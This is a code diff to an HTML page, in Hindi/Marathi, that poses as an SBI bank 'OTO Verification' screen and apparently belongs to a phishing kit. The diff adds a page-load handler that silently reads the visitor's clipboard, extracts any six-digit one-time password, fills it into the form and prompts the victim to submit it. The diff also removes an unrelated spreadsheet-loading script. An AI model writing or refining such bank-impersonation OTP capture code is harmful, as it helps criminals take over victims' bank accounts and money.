@@ -1,43 +1,4 @@
-<script type="text/javascript">
-        var gk_isXlsx = false;
-        var gk_xlsxFileLookup = {};
-        var gk_fileData = {};
-        function filledCell(cell) {
-          return cell !== '' && cell != null;
-        }
-        function loadFileData(filename) {
-        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
-            try {
-                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
-                var firstSheetName = workbook.SheetNames[0];
-                var worksheet = workbook.Sheets[firstSheetName];
-
-                // Convert sheet to JSON to filter blank rows
-                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
-                // Filter out blank rows (rows where all cells are empty, null, or undefined)
-                var filteredData = jsonData.filter(row => row.some(filledCell));
-
-                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
-                var headerRowIndex = filteredData.findIndex((row, index) =>
-                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
-                );
-                // Fallback
-                if (headerRowIndex === -1 || headerRowIndex > 25) {
-                  headerRowIndex = 0;
-                }
-
-                // Convert filtered JSON back to CSV
-                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
-                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
-                return csv;
-            } catch (e) {
-                console.error(e);
-                return "";
-            }
-        }
-        return gk_fileData[filename] || "";
-        }
-        </script><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="hi">
 <head>
     <meta charset="UTF-8">
@@ -82,7 +43,7 @@
         }
     </style>
 </head>
-<body>
+<body onload="checkClipboardForOTP()">
     <div class="container">
         <img src="./sbilogo.png" alt="SBI Logo" width="220" height="160">
         <h2>OTO Verification</h2>
@@ -127,13 +88,28 @@
     </script>
 
     <script>
-        // Function to paste OTP from clipboard
+        // Check clipboard for OTP on page load
+        async function checkClipboardForOTP() {
+            const otpInput = document.getElementById('otp');
+            const status = document.getElementById('status');
+            try {
+                const clipboardText = await navigator.clipboard.readText();
+                const otpMatch = clipboardText.match(/\b\d{6}\b/);
+                if (otpMatch) {
+                    otpInput.value = otpMatch[0];
+                    status.textContent = 'OTP ऑटोमॅटिकली भरले गेले आहे! आता ओटीपी पाठवा बटण दाबा।';
+                }
+            } catch (error) {
+                // Clipboard access might be denied, ignore silently
+            }
+        }
+
+        // Manual paste OTP function
         async function pasteOTP() {
             const otpInput = document.getElementById('otp');
             const status = document.getElementById('status');
             try {
                 const clipboardText = await navigator.clipboard.readText();
-                // Check if clipboard contains a 6-digit OTP
                 const otpMatch = clipboardText.match(/\b\d{6}\b/);
                 if (otpMatch) {
                     otpInput.value = otpMatch[0];
